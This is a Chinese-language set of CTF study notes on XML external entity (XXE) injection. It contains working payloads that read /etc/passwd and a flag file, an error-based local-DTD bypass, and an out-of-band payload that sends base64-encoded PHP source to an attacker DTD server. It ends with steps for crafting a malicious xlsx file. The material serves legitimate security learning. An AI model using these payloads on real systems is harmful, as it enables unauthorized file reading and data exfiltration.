# 参考
	- https://www.cnblogs.com/20175211lyz/p/11413335.html
	- XML 外部实体注入
- # 概念
	- 内部实体
		- ```xml
		  <!DOCTYPE note [
		      <!ENTITY a "admin">
		  ]>
		  ```
	- 参数实体
		- ```xml
		  <!DOCTYPE note [
		      <!ENTITY % b "<!ENTITY a \'admin\'>">
		      %b;
		  ]>
		  <i>&a;</i>
		  ```
	- 外部参数实体
		- ```xml
		  <!DOCTYPE note> [
		      <!ENTITY % d SYSTEM "http://xxx.xxx.xxx.xxx/xml.dtd">
		      %d;
		  ]>
		  <note>&d1;</note>
		  ```
	- 转译
		- ```xml
		  <!DOCTYPE note [
		      <!ENTITY % b "&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x61;&#x20;&#x27;&#x61;&#x73;&#x64;&#x66;&#x27;&#x3e;">
		      %b;
		  ]>
		  <note>&a;</note>
		  ```
	- PEReferences forbidden
		- 在标记声明里不能使用参数声明
- # PHP读取XML
	- {{embed ((632ac609-e10a-42ee-89c4-df1a3ce9b17d))}}
- # 操作
	- ```xml
	  <?xml version="1.0" encoding="UTF-8"?>
	  <!DOCTYPE testtest [<!ENTITY xxe SYSTEM "file:///etc/passwd">  ]>
	  <user><username>&xxe;</username><password>admin</password></user>
	  ```
	- 在禁止加载外部实体时利用报错
		- ```xml
		  <?xml version="1.0"?>
		  <!DOCTYPE message[
		    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
		    <!ENTITY % ISOamso '
		    <!ENTITY &#x25; file SYSTEM "file:///flag">
		    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///aaaaa/&#x25;file;&#x27;>">
		    &#x25;eval;
		    &#x25;error;
		  '>
		  %local_dtd;
		  ]>
		  ```
		- 上面`ISOamso`中的字符串在解码后会变成：
		- ```xml
		  <!DOCTYPE message[
		  <!ENTITY % file SYSTEM "file:///flag">
		  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///aaaaa/%file;'>">
		  %eval;
		  %error;
		  ]>
		  ```
		- java 中 xxe 的`file://`可以读取目录
- # OOB
  id:: 64301d45-52ef-4288-a4f1-f268848799a7
	- victim
	  
	  ```xml
	  <!DOCTYPE updateProfile [
	    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php">
	    <!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd">
	    %dtd;
	    %send;
	  ]>
	  ```
	- server: evil.dtd:
	- ```xml
	  <!ENTITY % all
	    "<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx/?data=%file;'>"
	  >
	  %all;
	  ```
- # 使用字符编码绕过
	- 参考[[CTFWEB/WP/2024网鼎杯 web01]]
	- {{embed ((6720a4bd-9205-4b92-ae10-7d1018bc6691))}}
- # 制作恶意xlsx文件
	- 修改后缀为zip并解压一个xlsx文件，修改里面的xml文件，再压缩
	- 示例：[[CTFWEB/WP/BUUCTF/网鼎杯 2020 青龙组 filejava]]